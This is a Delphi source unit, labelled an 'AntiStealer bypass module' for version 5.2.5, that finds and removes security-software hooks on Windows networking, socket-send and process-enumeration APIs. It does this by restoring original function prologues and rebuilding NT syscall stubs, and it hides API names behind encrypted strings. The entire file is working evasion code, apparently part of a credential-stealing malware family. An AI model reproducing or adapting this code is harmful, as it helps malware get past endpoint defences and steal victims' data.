//AntiStealer bypass module; Patch for 5.2.5; Doesn't works on WinXP; by barspinOff (c) 2019
unit ImportsDoctor;

interface

uses Windows, MemStrTools, commonDefs;

const
	enterOp: array [0..4] of byte = ($8B, $FF, $55, $8B, $EC);

type
	ImportsStorage = class
	private
		memoryAddresses: array [0..14] of Pointer;
		firstFiveBytes: array[0..74] of byte;
		Wininet, Winhttp, Kernel32, Ws2_32, ntdll: Cardinal;
		function FindSyscallIndex(Address: Pointer): Cardinal;
	public
		function SeeImports: Boolean;
		function CheckAndRepair(funcNumber: Byte): Boolean;
		function WriteBack(funcNumber: Byte): Boolean;
	end;

var
	Doctor: ImportsStorage;
	MainThread: Cardinal;

implementation

{$O-}
function ImportsStorage.SeeImports(): Boolean;
var i: Integer;
begin
	Kernel32 := GetModuleHandle(PChar(Tools.Crypt(COMDEF_LIBRARY_KERNEL, false)));
	Wininet := GetModuleHandle(PChar(Tools.Crypt(COMDEF_LIBRARY_WININET, false)));
	Winhttp := GetModuleHandle(PChar(Tools.Crypt(COMDEF_LIBRARY_WINHTTP, false)));
	Ws2_32 := GetModuleHandle(PChar(Tools.Crypt(COMDEF_LIBRARY_WINSOCK, false)));
	ntdll := GetModuleHandle(PChar(Tools.Crypt(COMDEF_LIBRARY_NTDLL, false)));
	
	if (Kernel32<>0) and (Wininet<>0) and (Winhttp<>0) and (Ws2_32<>0) and (ntdll<>0) then
	begin
		memoryAddresses[6] := GetProcAddress(Kernel32, PChar(Tools.Crypt(COMDEF_FUNCTION_PROC32FIRST_ANSI, false)));
		memoryAddresses[7] := GetProcAddress(Kernel32, PChar(Tools.Crypt(COMDEF_FUNCTION_PROC32NEXT_ANSI, false)));
		memoryAddresses[8] := GetProcAddress(Kernel32, PChar(Tools.Crypt(COMDEF_FUNCTION_PROC32FIRST_UNI, false)));
		memoryAddresses[9] := GetProcAddress(Kernel32, PChar(Tools.Crypt(COMDEF_FUNCTION_PROC32NEXT_UNI, false)));
		
		memoryAddresses[0] := GetProcAddress(Wininet, PChar(Tools.Crypt(COMDEF_FUNCTION_INETOPEN, false)));
		memoryAddresses[1] := GetProcAddress(Wininet, PChar(Tools.Crypt(COMDEF_FUNCTION_INETOPENURL, false)));
		memoryAddresses[3] := GetProcAddress(Wininet, PChar(Tools.Crypt(COMDEF_FUNCTION_INETCREATEURL_UNI, false)));
		memoryAddresses[2] := GetProcAddress(Wininet, PChar(Tools.Crypt(COMDEF_FUNCTION_INETCREATEURL_ANSI, false)));
		
		memoryAddresses[11] := GetProcAddress(Winhttp, PChar(Tools.Crypt(COMDEF_FUNCTION_WINHTTPCREATEURL, false)));
		
		memoryAddresses[4] := GetProcAddress(Ws2_32, PChar(Tools.Crypt(COMDEF_FUNCTION_GETADDRINFOEX_UNI, false)));
		memoryAddresses[12] := GetProcAddress(Ws2_32, PChar(Tools.Crypt(COMDEF_FUNCTION_GETADDRINFO, false)));
		memoryAddresses[13] := GetProcAddress(Ws2_32, PChar(Tools.Crypt(COMDEF_FUNCTION_GETADDRINFO_UNI, false)));
		memoryAddresses[14] := GetProcAddress(Ws2_32, PChar(Tools.Crypt(COMDEF_FUNCTION_SEND, false)));
		
		memoryAddresses[5] := GetProcAddress(ntdll, PChar(Tools.Crypt(COMDEF_NTFUNC_SETINFORMATIONFILE, false)));
		memoryAddresses[10] := GetProcAddress(ntdll, PChar(Tools.Crypt(COMDEF_NTFUNC_QUEUEAPCTHREAD, false)));
		
		for i:=0 to 14 do begin
			Tools.memcpy(@firstFiveBytes[5 * i], PByte(memoryAddresses[i]), 5);
		end;
		
		Result := true;
	end
	else Result := false;
end;

function ImportsStorage.FindSyscallIndex(Address: Pointer): Cardinal;
var
	i, idxAddr: Cardinal;
begin
	i := 0;
	idxAddr := 0;
	while true do
	begin
		Inc(i);
		if i > 999 then break;
		
		if PByte(Pointer(Cardinal(Address) + i))^ = $C2 then
		begin
			if PByte(Pointer(Cardinal(Address) + i + 3))^ <> $90 then
			begin
				if PByte(Pointer(Cardinal(Address) + i + 3))^ = $E9 then continue;
				idxAddr := Cardinal(Address) + i + 3;
				break;
			end;
			
			if PByte(Pointer(Cardinal(Address) + i + 4))^ <> $E9 then
			begin
				idxAddr := Cardinal(Address) + i + 4;
				break;
			end;
		end;
	end;
	if (i < 999) and (idxAddr<>0) then Result := Byte(PDword(Pointer(idxAddr + 1))^ - 1)
	else Result := 0;
end;

function ImportsStorage.CheckAndRepair(funcNumber: Byte): Boolean;
var
	dwOldProt, dwSysCall: Cardinal;
	pb: PByte;
begin
	if Self.firstFiveBytes[5 * funcNumber] = $E9 then
	begin
		VirtualProtect(memoryAddresses[funcNumber], 5, PAGE_EXECUTE_READWRITE, dwOldProt);
		if (funcNumber = 5) or (funcNumber = 10) then
		begin
			dwSysCall := Self.FindSyscallIndex(memoryAddresses[funcNumber]);
			PByte(memoryAddresses[funcNumber])^ := $B8;
			Tools.memcpy(Pointer(Cardinal(memoryAddresses[funcNumber]) + 1), @dwSysCall, 4);
		end
		else
		begin
			pb := @enterOp;
			Tools.memcpy(PByte(memoryAddresses[funcNumber]), pb, 5);
		end;
		VirtualProtect(memoryAddresses[funcNumber], 5, dwOldProt, dwOldProt);
		Result := true;
	end
	else Result := false;
end;

function ImportsStorage.WriteBack(funcNumber: Byte): Boolean;
var
	dwOldProt, dwSysCall: Cardinal;
	pb: PByte;
begin
	if Self.firstFiveBytes[5 * funcNumber] = $E9 then
	begin
		VirtualProtect(memoryAddresses[funcNumber], 5, PAGE_EXECUTE_READWRITE, dwOldProt);
		Tools.memcpy(PByte(memoryAddresses[funcNumber]), @firstFiveBytes[5 * funcNumber], 5);
		VirtualProtect(memoryAddresses[funcNumber], 5, dwOldProt, dwOldProt);
		Result := true;
	end
	else Result := false;
end;
{$O+}

end.